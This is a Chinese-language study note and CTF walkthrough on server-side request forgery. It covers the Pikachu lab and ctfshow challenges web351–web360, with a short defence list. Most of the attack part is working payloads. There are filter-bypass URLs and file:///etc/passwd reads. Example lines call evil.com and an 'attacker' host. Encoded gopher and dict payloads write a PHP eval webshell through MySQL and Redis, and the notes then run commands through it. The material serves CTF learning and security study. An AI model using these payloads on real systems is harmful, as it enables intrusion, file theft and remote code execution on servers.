# 基础

SSRF(Server-Side Request Forgery:**服务器端请求伪造**) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（**正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统**）SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等

## 黑盒思路

SSRF黑盒可能出现的地方

```
1.社交分享功能：获取超链接的标题等内容进行显示
2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
3.在线翻译：给网址翻译对应网页的内容
4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
8.数据库内置功能：数据库的比如mongodb的copyDatabase函数
9.邮件系统：比如接收邮件服务器地址
10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞
一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）
```

## 主要攻击方式： 

 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息。 

攻击运行在内网或本地的应用程序。 

 对内网 Web 应用进行指纹识别，识别企业内部的资产信息。 

攻击内外网的 Web 应用，主要是使用 HTTP GET 请求就可以实现的攻击(比如 struts2、SQli 等)。

 利用 file 协议读取本地文件等

## 导图

<img src="图片\0 (1).png" alt="0 (1)" style="zoom:80%;" />

<img src="图片\0 (2).png" alt="0 (2)" style="zoom:80%;" />

<img src="图片\0 (3).png" alt="0 (3)" style="zoom:80%;" />

## 绕过姿势

1、更改IP地址写法
比如：192.168.0.1可以写为

```
●8进制格式: 0300. 0250.0.1
●16进制格式: 0xCO. 0xA8.0.1
●10进制整数格式: 3232235521
●16进制整数格式: 0xC0A80001
●还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1
```

2.利用URL解析问题在某些情况下，后端程序可能会对访问的URL进行解析,对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当,导致可以绕过过滤。例如:

```
利用URL解析问题http://www.baidu.com@192. 168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容

可以指向任意ip的域名xip.io: http://127 .0.0.1.xip.io/==>http://127.0.0.1/

短地址http://dwz.cn/11SMa==>ttp://127.0.0.1

利用句号。: 127。0。0。1==>127.0.0.1

利用Enclosed alphanumerics
```

```
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

# pikachu初探

## SSRF 漏洞代码分析

重要代码，url 没有任何过滤传入，php 中的 curl 是 http 请求能访问远程页面

```php
//payload:
//file:///etc/passwd  读取文件
//http://192.168.1.15:22 根据banner返回,错误提示,时间延迟扫描端口

if(isset($_GET['url']) && $_GET['url'] != null){

    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];
    $CH = curl_init($URL);
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH) ;
//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
    echo $RES;
```

PHP中下面函数的使用不当会导致SSRF:

```
file_get_contents()  //file_get_contents() 函数把整个文件读入一个字符串中
fsockopen()
curl_exec()
```

## 尝试攻击

### 1.http 协议

根据 baner 的信息获取内网

```
http://127.0.0.1:8082/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:8082
```

可以通过返回的时间和长度判断端口的开放，请求 mysql

```
http://127.0.0.1:8082/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306
```

### 2.file 协议读取文件

```
http://127.0.0.1:8082/vul/ssrf/ssrf_curl.php?url=file:///D:/phpstudy/WWW/pikachu/test.txt
```

### 3.dict 协议内网扫描

能进行内网端口的探测-可以探测到具体的版本号等等信息

```
http://127.0.0.1:8082/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306
```

### 4.gopher 协议

能进行内网端口的探测-可以发送 get 或者来攻击内网的 redis 等服务

```
http://127.0.0.1:8082/vul/ssrf/ssrf_curl.php?url=gopher://127.0.0.1:3306
```

## SSRF 支持的协议

```
ftp
ssrf.php?url=ftp://evil.com:12345/TEST

file://
ssrf.php?url=file:///etc/passwd

Dict://
dict://<user-auth>@<host>:<port>/d:<word>
ssrf.php?url=dict://attacker:11111/

SFTP://
ssrf.php?url=sftp://example.com:11111/

TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET

LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit

Gopher://
ssrf.php?url=gopher://127.0.0.1:3306
```

## 防御方案

1.禁止跳转

2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准

3.禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题

4.设置 URL 白名单或者限制内网 IP（使用 gethostbyname()判断是否为内网 IP）

5.限制请求的端口为 http 常用的端口，比如 80、443、8080、8090

6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态

# ctfshow

## web351

发现跟之前 pikachu 靶场的很像，这个是 POST，我们该如何利用 SSRF 获取 flag 呢？

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

POST 发包，读到了 passwd

```
url=file:///etc/passwd
```

读 flag

```
url=file:///var/www/html/flag.php
```

## web352

增加了过滤，localhost|127.0.0 不能用

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

我们是是 ip 地址转数字   https://www.bejson.com/convert/ip2int/

```
127.0.0.1
2130706433
url=http://2130706433/flag.php
```

或者  ip 用其它进制转换   https://tool.520101.com/wangluo/jinzhizhuanhuan/

```
十六进制
url=http://0x7F.0.0.1/flag.php
八进制
url=http://0177.0.0.1/flag.php
10 进制整数格式
url=http://2130706433/flag.php
16 进制整数格式，还是上面那个网站转换记得前缀0x
url=http://0x7F000001/flag.php
还有一种特殊的省略模式
127.0.0.1写成127.1
用CIDR绕过localhost
url=http://127.127.127.127/flag.php
还有很多方式不想多写了
url=http://0/flag.php
url=http://0.0.0.0/flag.php
```

## web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

```
url=http://sudo.cc/flag.php
```

DNS-Rebinding攻击绕过

```
url=http://r.xxxzc8.ceye.io/flag.php 自己去ceye.io注册绑定127.0.0.1然后记得前面加r
```

302跳转绕过也行，在自己的网站主页加上这个

```
<?php
header("Location:http://127.0.0.1/flag.php");
```

再或者我自己的域名A记录设为了127.0.0.1

或者有个现成的A记录是127.0.0.1的网站

```
url=http://sudo.cc/flag.php
```

## web354

302跳转绕过也行，在自己的网站主页加上这个

```
<?php
header("Location:http://127.0.0.1/flag.php");
```

## web355

设置了$host<5的限制，随便来个利用127.0.0.1=127.1刚好是5位

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

```
url=http://127.1/flag.php
```

## web356

更绝了限制$host<3，老规矩

```
url=http://0/flag.php
```

## web357

关键代码，不能是一些私有地址

```php
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}
```

```
FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。
```

用web353说过的 DNS-Rebinding 与 302跳转即可解题

## web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

正则匹配，以固定的值开头以固定的值结尾

```
url=http://ctf.@127.0.0.1/flag.php#.show
```

## web359

参考见 CTFer 成长之路 第 74 页 

```
file:///E:/渗透课件/Information_Security_Books/175从0到1：CTFer成长之路/从0到1：CTFer成长之路.pdf   
```

本题是打无密码的 mysql

https://github.com/tarunkant/Gopherus

```
python gopherus.py --exploit mysql
root
select '<?php eval($_POST[pass]); ?>' INTO OUTFILE '/var/www/html/2.php';
```

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4a%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%20%3f%3e%27%20%49%4e%54%4f%20%4f%55%54%46%49%4c%45%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%32%2e%70%68%70%27%3b%01%00%00%00%01
```

_ 后面内容再进行一次 url 编码

```
gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254a%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2570%2561%2573%2573%255d%2529%253b%2520%253f%253e%2527%2520%2549%254e%2554%254f%2520%254f%2555%2554%2546%2549%254c%2545%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501
```

<img src="图片\Snipaste_2023-02-03_14-21-58.png" alt="Snipaste_2023-02-03_14-21-58" style="zoom:80%;" />

发现 shell 已经写入进去了

<img src="图片\Snipaste_2023-02-03_14-27-35.png" alt="Snipaste_2023-02-03_14-27-35" style="zoom:80%;" />

```
pass=system('ls /');
```

```
pass=system('tac /f*');
```

## web260

 SSRF+Redis  

- 写webshell
- 写ssh公钥
- 写contrab计划任务反弹shell
- 主从复制

### 方法一

我们写 webshell

```
python gopherus.py --exploit redis
php
<?php eval($_POST[x]);?>
```

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5Bx%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

二次url编码 _ 后面的部分

```
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255Bx%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

### 方法二

```
url=dict://127.0.0.1:6379
```

<img src="图片\Snipaste_2023-02-03_15-01-48.png" alt="Snipaste_2023-02-03_15-01-48" style="zoom:80%;" />

```
url=dict://127.0.0.1:6379/info
```

字符串转16进制

```
<?php eval($_POST[x]);?>
```

```
\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e
```

```
url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
```

```
url=dict://127.0.0.1:6379/config:set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x78\x5d\x29\x3b\x3f\x3e"
```

```
url=dict://127.0.0.1:6379/config:set:dbfilename:x.php
```

```
url=dict://127.0.0.1:6379/save
```

# 好文章

https://www.t00ls.com/articles-41070.html
